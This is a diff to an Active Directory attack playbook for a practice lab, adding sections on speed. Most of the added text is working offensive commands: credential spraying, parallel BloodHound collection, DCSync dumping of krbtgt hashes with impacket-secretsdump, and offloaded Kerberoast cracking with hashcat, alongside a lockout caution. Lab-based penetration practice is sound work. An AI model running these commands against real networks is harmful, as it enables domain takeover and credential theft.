@@ -87,3 +87,38 @@ responder -I eth0 -wd
 hashcat -m 18200 /logs/hashes/asrep.txt /usr/share/wordlists/rockyou.txt
 hashcat -m 13100 /logs/hashes/kerb.txt /usr/share/wordlists/rockyou.txt
 ```
+
+## Go fast: parallel fan-out + stock creds (Kali)
+
+```bash
+# stock-cred fast path on a known lab — parallel, ~1 min, often DA-grade
+/opt/adtk/spray-stock.sh 192.168.56.10 192.168.56.11 192.168.56.12
+
+# bounded parallel executor: one shell command per line, ADTK_FANOUT at a time
+printf '%s\n' \
+  "bloodhound-python -c All -d sevenkingdoms.local -u u -p p -ns 192.168.56.10 -o /logs/bh/sk" \
+  "bloodhound-python -c All -d north.sevenkingdoms.local -u u -p p -ns 192.168.56.11 -o /logs/bh/north" \
+  "bloodhound-python -c All -d essos.local -u u -p p -ns 192.168.56.12 -o /logs/bh/essos" \
+  | /opt/adtk/fan.sh
+# per-domain DCSync in parallel (NetBIOS-prefixed krbtgt — see impacket.md)
+printf '%s\n' \
+  "impacket-secretsdump 'SEVENKINGDOMS/da:PASS@192.168.56.10' -just-dc-user SEVENKINGDOMS/krbtgt -just-dc-ntlm" \
+  "impacket-secretsdump 'NORTH/da:PASS@192.168.56.11' -just-dc-user NORTH/krbtgt -just-dc-ntlm" \
+  | ADTK_FANOUT=3 /opt/adtk/fan.sh
+```
+
+Do not `fan.sh` a blind wordlist spray — parallel guesses still count toward
+lockout. Stock-cred and per-domain BloodHound/DCSync are safe (one known
+answer / read-only replication).
+
+## Go fast: crack on the HOST, not the VM
+
+The Kali VM has no GPU. Capture the hash on Kali, pull it to the host
+(`logs_read` over MCP, or scp), then crack there and feed the cred back:
+
+```bash
+# on the host (Shell), not on Kali:
+ADTK_WORDLIST=~/wordlists/rockyou.txt \
+  scripts/host-crack.sh --mode 13100 --hash ./kerb.txt --budget 300 --background
+# → prints user:pass, writes kerb.txt.cracked; keep enumerating meanwhile
+```
